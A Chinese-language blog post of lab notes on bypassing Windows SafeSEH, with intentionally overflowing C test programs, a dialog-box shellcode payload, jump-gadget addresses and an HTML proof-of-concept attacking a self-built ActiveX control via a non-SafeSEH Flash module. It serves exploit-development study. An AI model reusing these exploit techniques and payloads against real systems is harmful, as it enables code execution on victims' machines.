---
title: 绕过SafeSEH的方法
date: 2017-07-08 10:01:51
categories: 安全技术
tags: [SEH, windows]
---

### 1. 攻击返回地址绕过SafeSEH

在[《栈溢出原理与实践》](/2017/06/22/栈溢出原理与实践/)中有介绍

### 2. 利用虚函数绕过SafeSEH

在[《绕过GS安全编译的方法》](/2017/07/04/绕过GS安全编译的方法/)中有范例

### 3. 从堆中绕过SafeSEH

#### 3.1 实验代码

<pre><code>
#include "stdafx.h"
#include "stdlib.h"
#include "string.h"

char shellcode[] =
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xB8\x28\x39\x00";

void test(char *input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0;
	zero = 1/zero;
}

void main()
{
	char * buf = (char *)malloc(500);
	//__asm int 3
	strcpy(buf, shellcode);
	test(shellcode);
}
</code></pre>

#### 3.2 实验内容

<b>实验思路：</b>
1. 首先从堆中申请500字节的空间，用来存放shellcode
2. 函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息
3. 用shellcode在堆中的起始位置覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，进而跳转到堆中的shellcode执行

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| DEP关闭|
|编译器|Visual Studio 2008| |
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本| |

<b>得到的数据</b>
申请的堆空间起始地址:0x003928B8
复制给str后的栈起始地址：0x0012FE9C
离栈顶最近的SEH处理函数句柄：0x0012FFB0+4

<b>于是得到shellcode：</b>
1. 168字节的谈对对话框机器码
2. 112 * "\x90"
3. 堆起始地址: 0x003928B8

### 4. 利用未启用SafeSEH模块绕过SafeSEH

<font color=#f00>如果模块未启用SafeSEH，并且模块不是仅包含中间语言IL，这个异常处理就可以被执行。所以若能找到一个不启用SafeSEH的dll，然后加载之后通过它里面的指令作为跳板实现SafeSEH的绕过。</font>

#### 4.1 实验代码

<pre><code>
#include "stdafx.h"
#include "string.h"
#include "windows.h"

char shellcode[] = 
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x68"
	"\xf1\x21\x12\x11"
	"\x90\x90\x90\x68\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char *input)
{
	char str[200];
	strcpy(str, input);
	int zero = 0;
	__try{
		zero = 1/zero;
	}
	__except(MyException()){}
}

int _tmain(int argc, _TCHAR *argv[])
{
	// Load NO_SafeSEH Module
	HINSTANCE hInst = LoadLibrary(_T("SEH_NOSafeSEH_JUMP.dll"));
	char str[200];
	//__asm int 3
	test(shellcode);
	return 0;
}
</code></pre>

#### 4.2 实验内容

<b>实验思路：</b>
1. 用VC++ 6.0编译一个不是用SafeSEH的动态链接库SEH_NOSafeSEH_JUMP.DLL，然后由启用SafeSEH的应用程序SEH_NOSafeSEH.EXE去加载
2. SEH_NOSafeSEH中的test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息
3. 使用SEH_NOSafeSEH_JUMP.DLL中的"pop pop retn"指令地址覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理。通过劫持异常处理流程，程序转入SEH_NOSafeSEH_JUMP.DLL中执行"pop pop retn"指令，在执行retn后程序转入shellcode执行。

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| DEP关闭|
|EXE编译器|Visual Studio 2008| |
|DLL编译器|VC++ 6.0|将dll基址设为0x11120000|
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本| |

<b>编译DLL</b>

1. 在VC++ 6.0新建“Win32 Dynamic-Link Library”工程，创建一个<font color=#f00>简单的DLL工程</font>
2. 按照实验代码编写对应的cpp文件
3. 由于VC++ 6.0默认编译的DLL文件加载地址为0x10000000，如果其作为DLL加载地址可能会包含0x00，这会导致strcpy字符串截断，所以为方便测试，需要重新设置基址。"工程->设置->连接选显卡"，在"工程选项"输入框中添加"/base:"0x11120000""
![编译DLL的图](/images/2017-07-08/dll_setting.jpg)

<b>OllySSEH插件说明</b>
对于SafeSEH描述分为以下四种，如图所示
1. /SafeSEH OFF: 未启用SafeSEH，这种模式可作为跳板
2. /SafeSEH ON：启用SafeSEH，可以使用右键点击查看SEH注册情况
3. NO SEH：不支持SafeSEH，即IMAGE_DLLCHARACTERISTICS_NO_SEH标志位被设置，模块内的异常会被忽略，所以不能作为跳板
4. Erro：读取错误

![ollysseh描述图](/images/2017-07-08/ollysseh.jpg)

<b>后续操作</b>
1. 在SEH_NOSafeSEH_JUMP.DLL中找到"pop pop retn"序列。非常蛋疼的是明明在dll文件中写入一个函数"pop eax, pop eax, retn"，但是在编译的时候就找不到了。不过dll文件中存在"pop ecx, pop ecx, retn"这样原始序列，我们也可以拿来使用，位置为0x111221F1
2. 溢出字符串起始位置0x0012FDB8<br>最近的异常处理函数句柄0x0012FE90+4
3. VS 2008编译的程序，在进入含有\_\_try{}的函数时会在Security Cookie+4的位置压入-2（VC++ 6.0下为-1），在程序进入\_\_try{}区域时程序会根据该\_\_try{}块在函数中的位置而修改成不同的值（第一层try会将这个值修改为0， 第二层会将这个值修改1）。如果\_\_try{}块中出现异常，程序会根据这个值调用相应的\_\_except()处理，处理结束后这个位置的值会重新修改为-2；如果每发生异常，程序会在离开\_\_try{}块时这个值也会被修改回-2。
4. 由于上面的操作，如果将shellcode放在前面的话可能会对弹出对话框的造成破坏，所以将弹出对话框的机器码放在了最后

<br>
<b>shellcode组成</b>
1. 220 * "\x90"
2. "pop pop retn"地址0x111221F1
3. 16 * "\x90"
4. 168字节的弹出对话框机器码
<br>

#### 4.3 验证及其思考

<br>
由于用上面的shellcode无法正常出现弹框，所以我花了半天时间来解决这中间的问题！

<b><font color=#f00>Ollydbg如何调试SEH？</font></b><font color=#0f0>
1. 首先程序运行到出错的汇编代码处，然后两次"Shift+F7"进入错误判断程序
2. 然后通过SEH Chain窗口，获取离栈顶最近的SEH，双击跳转至该地址，"F2"设置断点
3. 最后直接"F9"跳转至该位置
</font>

![第一次SEH处理句柄](/images/2017-07-08/seh1.jpg)

<b><font color=#f00>"pop pop retn"作为异常处理函数所做的工作</font></b><font color=#0f0>
1. 首先，弹出异常判断回去的指针
2. 然后弹出原始栈顶中的一位参数
3. 最后返回离栈顶最近的SEH的链表指针所在地址(而不是函数处理句柄)【有时候由于没有中间的参数，而导致返回的是函数处理句柄】
</font>

![进入shellcode](/images/2017-07-08/seh2.jpg)

从上面的图片可以看出，2112被解析成"AND DWORD PTR DS:[EDX],EDX"，而EDX是不能被修改的，所以出错，后面的指令也陆续发生错误！

<font color=#f00>解决办法：修改SEH链表指针"\x90\x90\x90\x90"。</font>
<font color=#f00>本人尝试了很多办法，最后使用的将0x111221F1作为push的参数压入栈中</font>
![修改后的结果](/images/2017-07-08/seh3.jpg)

紧接着的数据本来是"\x90\x90\x90\x90"，但是可能中间的某些操作导致该数据被修改为0000，可以使用同样的办法，将其压入栈中

<b>最终的shellcode组成</b>
1. 219 * "\x90" + "\x68"
2. "pop pop retn"地址0x111221F1
3. 3 \* "\x90" + "\x68" + 12 \* "\x90"
4. 168字节的弹出对话框机器码

<br>

### 5. 利用加载模块之外的地址绕过SafeSEH

<br>
OllyDbg调试时，用"view->memory"可以查看程序的映射状态。类型为"Map"的映射文件，SafeSEH是无视的。当异常处理函数指针指向这些地址范围内时，是不对其进行有效性验证的。如果可以在这些文件中找到跳板指令，就可以绕过SafeSEH。

<pre><code>
其实除了"pop pop retn"指令序列外，一下指令也可以使用：
call/jmp dword ptr [esp+0x8]
call/jmp dword ptr [esp+0x14]
call/jmp dword ptr [esp+0x1c]
call/jmp dword ptr [esp+0x2c]
call/jmp dword ptr [esp+0x44]
call/jmp dword ptr [esp+0x50]
call/jmp dword ptr [ebp+0xc]
call/jmp dword ptr [ebp+0x24]
call/jmp dword ptr [ebp+0x30]
call/jmp dword ptr [ebp-0x4]
call/jmp dword ptr [ebp-0xc]
call/jmp dword ptr [ebp-0x18]

</code></pre>

#### 5.1 实验代码

<pre><code>
#include "stdafx.h"
#include "string.h"
#include "windows.h"

char shellcode[] = 
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"
	"\xEB\xF6\x90\x90"
	"\x0B\x0B\x28\x00";

DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

void test(char * input)
{
	char str[200];
	strcpy(str, input);
	int zero=0;
	__try
	{
		zero = 1/zero;
	}
	__except(MyException()){}
}

int _tmain(int argc, _TCHAR* argv[])
{
	//__asm int 3
	test(shellcode);
	return 0;
}

</code></pre>

#### 5.2 实验内容

<b>实验思路：</b>
1. Test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH
2. 该程序中所有加载模块都启用了SafeSEH机制，故不能通过未启用SafeSEH的模块来绕过SafeSEH
3. 将异常处理函数指针覆盖为加载模块外的地址来实现对SafeSEH的绕过，然后通过除0触发异常程序转入异常处理，进而劫持程序流程。

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3| DEP关闭|
|编译器|Visual Studio 2008| |
|编译选项|<font color=#f00>禁用优化选项</font>| |
|build版本|release版本| |

<b>实验内容：</b>
1. 获取数据：(溢出字符串起始位置0x0012FE88)<br>(距离栈顶最近的异常处理函数句柄0x0012FF60+4)
2. 使用OllyDbg插件OllyFindAddr，可以在整个程序的内存空间搜索。本实验使用call/jmp dword ptr[ebp+n]指令作为跳板。"Plugins->OllyFindAddr->Overflow return address->Find CALL/JMP [EBP+N]"来进行指令的搜索。
3. 在0x00280B0B中找到了call [ebp+x030]的指令(但是0x00会被截断，如果是Unicode漏洞就不用考虑这个问题，因为Unicode的结束符号为0x0000)
4. 使用两段跳的方式跳至shellcode起始处执行
	* 通过一个2字节的短跳指令0xEBF6向回跳8个字节
	* 在这8个字节中布置一条5字节的长跳转指令完成最终的回跳
![搜索跳板的结果](/images/2017-07-08/map_call.jpg)

<b>shellcode组成：</b>
1. 168字节的弹出对话框机器码
2. 40 \* "\x90"
2. 长跳指令和0x90填充 "\xE9\x2B\xFF\xFF\xFF\x90\x90\x90"
3. 短跳转指令和0x90填充 "\xEB\xF6\x90\x90"
4. 跳板指令"\x0B\x0B\x28\x00"

<br>

#### 5.3 验证及其思考

<br>
由于一开始无法在0x00280B0B处设置断点，所以无法进入去查看,后来使用Animate into之后，能够在0x00280B0B处停止，方便我们调试。进入之后发现跳转指令直接跳转至SEH的链表指针所在地址，这就有我们 前面讲的shellcode来源。

### 6. 利用Adobe Flash Player ActiveX控件绕过SafeSEH

该方法就是利用未启用SafeSEH模块绕过SafeSEH的浏览器版。Flash Player ActiveX在9.2.124之前的版本不支持SafeSEH，所以若我们能够在这个控件中找到合适的跳板地址，就可以绕过SafeSEH。

#### 6.1 绕过SafeSEH需要三方面的支持

1. 具有溢出漏洞的ActiveX控件
2. 未启用SafeSEH的Flash Player ActiveX控件
3. 可以触发ActiveX控件中溢出漏洞的POC页面

#### 6.2 基于MFC的ActiveX控件

建立好控件工程后，使用类视图中的"VulnerAX_SEHLib->DVulnerAX->Add->Add Method"，添加一个可以在Web页面中调用的接口函数，函数返回类型为void，函数名为test，参数类型为BSTR，参数名为str

VulnerAX_SEHCtrl.cpp中的test函数
<pre><code>
DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}

// CVulnerAX_SEHCtrl message handlers

void CVulnerAX_SEHCtrl::test(LPCTSTR str)
{
	//AFX_MANAGE_STATE(AfxGetStaticModuleState());
	// TODO: Add your dispatch handler code here
	printf("aaaa");		//定位该函数的标记
	char dest[100];
	sprintf(dest, "%s", str);
	int zero = 0;
	__try
	{
		zero = 1/zero;
	}
	__except(MyException())
	{
	}
}

</code></pre>

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|编译器|Visual Studio 2008| |
|优化|<font color=#f00>禁用优化选项</font>| |
|MFC|在静态库中使用MFC|工程属性->General->Use of MFC|
|字符集|使用Unicode字符集|工程属性->General->Character Set|
|build版本|release版本| |

编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32

#### 6.3 POC

<pre><code>
&lt;html&gt;
&lt;body&gt;
&lt;embed src="map.swf" quality="high" type="application/x-shockwave-flash" width="160"
height="260"&gt;&lt;/embed&gt;
&lt;object classid="clsid:F010E769-5E95-4DBB-943D-AF2D1FE10C34" id="test"&gt;&lt;/object&gt;
&lt;script&gt;
var s = "\u9090";
while (s.length &lt; 60) {
    s += "\u9090";
}
s += "\u0EEB\u9090";
s += "\uA0C6\u021D";
s += "\u9090\u9090\u9090\u9090";
s += "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3\u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08\u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd\u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c\u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38\ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857";
test.test(s);
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>

这个代码和书上的不一致，但是完全正确。需要注意的是，我们使用的embed中的map.swf需要和该html在同一文件夹下，而object中的classid其实可以从VulnerAX_SEH.idl中找到。注意只能是下面代码中那处显示的uuid，其它位置处的都不行！！！

<pre><code>
	//  Class information for CVulnerAX_SEHCtrl

	[ uuid(F010E769-5E95-4DBB-943D-AF2D1FE10C34),
	  helpstring("VulnerAX_SEH Control"), control ]
	coclass VulnerAX_SEH
	{
		[default] dispinterface _DVulnerAX_SEH;
		[default, source] dispinterface _DVulnerAX_SEHEvents;
	};
</code></pre>

#### 6.5 实验内容

<b>实验思路：</b>
1. 在POC页面中随便插入一个Flash，让浏览器能够加载Flash控件
2. 在POC页面中调用VulnerAX_SEH.ocx控件中的test函数，并向其传递超长字符串，以触发test函数中的溢出漏洞。
3. 通过溢出手段将VulnerAX_SEH.ocx中的异常处理函数地址覆盖为Flash控件中的跳转地址。由于Flash控件没有启用SafeSEH，所以这个跳板地址可以绕过SafeSEH
4. Test函数触发除0异常后，程序会去调用异常处理函数，由于异常处理函数地址已经被覆盖，所以劫持了程序流程。

<b>实验环境：</b>

||推荐使用环境|备注|
|--|--|--|
|操作系统|Windows XP SP3||
|浏览器|Internet Explorer 6||
|Flash控件版本|9.0.115.0|未启用SafeSEH的最后一版9.2.124|

<b>实验步骤：</b>
1. 修改POC，将s设置为90字节的0x90，用IE访问POC页面。
2. 如果浏览器提示ActiveX控件被拦截等信息请自行设置浏览器权限，当浏览器弹出下图所示对话框，就可以用Ollydbg附加IE的进程<font color=#f00>（打开Ollydbg，点击File->attach，找到IExplorer进程，attach上去即可）</font>，附加好后按F9让程序继续运行
![ActiveX提示](/images/2017-07-08/activex.jpg)
3. 找到VulnerAX_SEH.ocx的内存空间，查找字符串"aaaa"，在此位置设置好断点0x100017DC<font color=#f00>（这是最近两天才发现的，设置断点一定要在CPU主界面设置，否则就设置不成功！）</font>。我的方法如下图:先在Memory窗口中找到VulnerAX_SEH所在位置，然后搜索字符串"aaaa"，在rdata中找到了字符串，记下地址0x1003F9F8，再在.text中找字符串"\xF8\xF9\x03\x10"，就可以找到printf("aaaa")的位置
![查找函数的方法](/images/2017-07-08/breakpoint_printf_aaaa.jpg)
4. 点击浏览器对话框中的"是"按钮，程序会中断在我们设置好的断点位置
5. 单步执行完sprintf(0x100017F9)之后，得到数据：溢出字符串的起始位置0x0012E014；离栈顶最近的异常处理函数句柄在0x0012E08C+4。故需填充124(0x7C)个字节就可以覆盖到异常处理函数地址。
6. 在Flash控件中搜索跳板指令。<font color=#f00>通过OllySEEH找到/SafeSEH OFF区域，如图所示。</font>然后使用OllyFindAddr插件的Find CALL/JMP [EBP+N]选项来查找，最后在flash.ocx中找到了多条跳板。如图所示：我们使用0x021DA0C6处的CALL [EBP-0x18]作为跳板<font color=#f00>（不知道怎么回事，有些跳板地址用不了，当你输入0x02187625，但是进入函数之后跳板地址就变为了0x02137625）</font>
![SafeSEH展示](/images/2017-07-08/safeseh.jpg)
![跳板指令](/images/2017-07-08/call_jmp.jpg)
7. 程序执行跳板指令后，会回到SEH的链表指针所在地址。即"\u9090\u9090\uA0C6\u021D"处。

<b>shellcode组成：</b>
1. 120字节0x90   60 \* "\u9090"
2. 向后短跳16字节 "\u0EEB\u9090"
3. Flash控件的跳板指令地址 "\uA0C6\u021D"
4. 8字节的0x90填充	"\u9090\u9090\u9090\u9090"
4. 168字节的弹出对话框机器码
 "\u68fc\u0a6a\u1e38\u6368\ud189\u684f\u7432\u0c91\uf48b\u7e8d\u33f4\ub7db\u2b04\u66e3
 \u33bb\u5332\u7568\u6573\u5472\ud233\u8b64\u305a\u4b8b\u8b0c\u1c49\u098b\u698b\uad08
 \u6a3d\u380a\u751e\u9505\u57ff\u95f8\u8b60\u3c45\u4c8b\u7805\ucd03\u598b\u0320\u33dd
 \u47ff\u348b\u03bb\u99f5\ube0f\u3a06\u74c4\uc108\u07ca\ud003\ueb46\u3bf1\u2454\u751c
 \u8be4\u2459\udd03\u8b66\u7b3c\u598b\u031c\u03dd\ubb2c\u5f95\u57ab\u3d61\u0a6a\u1e38
 \ua975\udb33\u6853\u6577\u7473\u6668\u6961\u8b6c\u53c4\u5050\uff53\ufc57\uff53\uf857"